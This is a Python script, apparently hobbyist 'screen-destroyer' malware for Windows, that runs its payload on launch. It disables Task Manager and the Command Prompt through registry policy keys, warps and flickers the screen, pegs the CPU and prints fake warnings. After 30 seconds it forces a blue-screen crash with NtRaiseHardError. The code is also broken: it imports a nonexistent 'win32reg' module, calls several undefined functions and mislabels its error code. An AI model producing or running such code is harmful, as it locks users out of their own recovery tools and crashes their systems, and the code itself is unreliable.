import win32api
import win32con
import win32reg
import random
import time
import threading
import ctypes
from win32gui import GetDesktopWindow, GetWindowRect, GetDC, RedrawWindow, AlphaBlend, StretchBlt, BitBlt, SetStretchBltMode
from win32api import GetSystemMetrics
from time import sleep

# Desktop dimensions
x = GetSystemMetrics(0)
y = GetSystemMetrics(1)
desktop = GetDesktopWindow()
left, top, right, bottom = GetWindowRect(desktop)

# Resource management function
def clean_up(hdc, memdc, hbit, sel):
    SelectObject(memdc, sel)
    DeleteObject(sel)
    DeleteObject(hbit)
    DeleteDC(memdc)
    DeleteDC(hdc)

def redraw():
    RedrawWindow(0, None, None, win32con.RDW_ERASE | win32con.RDW_INVALIDATE | win32con.RDW_ALLCHILDREN)

# Disable Task Manager and Command Prompt
def disable_task_manager_and_cmd():
    try:
        # Disable Task Manager by modifying the registry
        reg_key = win32reg.OpenKey(win32reg.HKEY_CURRENT_USER,
                                   r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, win32con.KEY_WRITE)
        win32reg.SetValueEx(reg_key, "DisableTaskMgr", 0, win32con.REG_DWORD, 1)
        win32reg.CloseKey(reg_key)
        
        # Disable Command Prompt by modifying the registry
        reg_key = win32reg.OpenKey(win32reg.HKEY_CURRENT_USER,
                                   r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, win32con.KEY_WRITE)
        win32reg.SetValueEx(reg_key, "DisableCMD", 0, win32con.REG_DWORD, 1)
        win32reg.CloseKey(reg_key)
        
        print("Task Manager and Command Prompt have been disabled.")
    except Exception as e:
        print(f"Error disabling Task Manager and Command Prompt: {e}")

# Re-enable Task Manager and Command Prompt (if needed)
def enable_task_manager_and_cmd():
    try:
        # Enable Task Manager
        reg_key = win32reg.OpenKey(win32reg.HKEY_CURRENT_USER,
                                   r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, win32con.KEY_WRITE)
        win32reg.SetValueEx(reg_key, "DisableTaskMgr", 0, win32con.REG_DWORD, 0)
        win32reg.CloseKey(reg_key)
        
        # Enable Command Prompt
        reg_key = win32reg.OpenKey(win32reg.HKEY_CURRENT_USER,
                                   r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, win32con.KEY_WRITE)
        win32reg.SetValueEx(reg_key, "DisableCMD", 0, win32con.REG_DWORD, 0)
        win32reg.CloseKey(reg_key)
        
        print("Task Manager and Command Prompt have been enabled.")
    except Exception as e:
        print(f"Error enabling Task Manager and Command Prompt: {e}")

# Force BSOD function
def trigger_bsod():
    """
    This function will force a BSOD on the system by raising a hard error.
    WARNING: Use with caution! This can crash your system.
    """
    error_code = 0xC000021A  # STATUS_FATAL_APP_EXIT
    ctypes.windll.ntdll.NtRaiseHardError(error_code, 0, 0, 0, 0, 0)

# Radial movement effect
def radial_move():
    while True:
        hdc = GetDC(0)
        memdc = CreateCompatibleDC(hdc)
        hbit = CreateCompatibleBitmap(hdc, x, y)
        sel = SelectObject(memdc, hbit)

        val = random.randint(1, 2)
        rateofturning = 30
        print(val)

        if val == 1:
            PlgBlt(memdc, [(left - rateofturning, top + rateofturning),
                           (right - rateofturning, top - rateofturning),
                           (left + rateofturning, bottom + rateofturning)],
                   hdc, 0, 0, x, y, 0, 0, 0)

        if val == 2:
            PlgBlt(memdc, [(left + rateofturning, top - rateofturning),
                           (right + rateofturning, top + rateofturning),
                           (left - rateofturning, bottom - rateofturning)],
                   hdc, 0, 0, x, y, 0, 0, 0)

            AlphaBlend(hdc, random.randint(-10, 10), random.randint(-10, 10), x, y, memdc, 0, 0, x, y,
                       (0, 0, 70, 0))

        clean_up(hdc, memdc, hbit, sel)
        sleep(0.2)

# Flickering effect (Enemy 1)
def screen_flicker():
    while True:
        RedrawWindow(0, None, None, win32con.RDW_ERASE | win32con.RDW_INVALIDATE | win32con.RDW_ALLCHILDREN)
        sleep(random.uniform(0.1, 0.3))  # Flicker every 0.1 to 0.3 seconds

# CPU Intensive task (Enemy 2)
def cpu_intensive_task():
    while True:
        x = 0
        for _ in range(10**7):  # CPU Intensive loop
            x += random.randint(0, 100)
        sleep(0.1)

# Warning display (Simulates enemy warnings)
def display_warnings():
    while True:
        print("Warning: Unauthorized behavior detected!")
        time.sleep(random.uniform(3, 7))  # Display warning every 3 to 7 seconds
        print("Enemy approaching!")
        time.sleep(random.uniform(2, 5))  # Another warning after 2 to 5 seconds

# Kill thread function (used to terminate a thread gracefully)
def kill_thread(thread):
    thread_id = thread.ident
    res = ctypes.pythonapi.PyThreadState_SetAsyncExc(thread_id, ctypes.py_object(SystemExit))
    if res > 1:
        ctypes.pythonapi.PyThreadState_SetAsyncExc(thread_id, 0)
        print('Exception raise failure')

# Start threads
def start_threads():
    disable_task_manager_and_cmd()  # Disable Task Manager and Command Prompt

    # Start threads for various effects and warnings
    t1 = threading.Thread(target=radial_move)
    t2 = threading.Thread(target=screen_flicker)  # Enemy 1: Flickering screen
    t3 = threading.Thread(target=cpu_intensive_task)  # Enemy 2: CPU intensive task
    t4 = threading.Thread(target=display_warnings)  # Warning thread
    t5 = threading.Thread(target=shake_cursor)  # Cursor shaking effect

    t1.start()
    time.sleep(15)
    kill_thread(t1)

    t2.start()  # Start screen flicker thread
    t3.start()  # Start CPU-intensive task thread
    t4.start()  # Start warning thread
    t5.start()  # Start the cursor shaking thread

    # Wait 30 seconds before triggering the BSOD
    print("Waiting 30 seconds before triggering BSOD...")
    time.sleep(30)
    trigger_bsod()

start_threads()
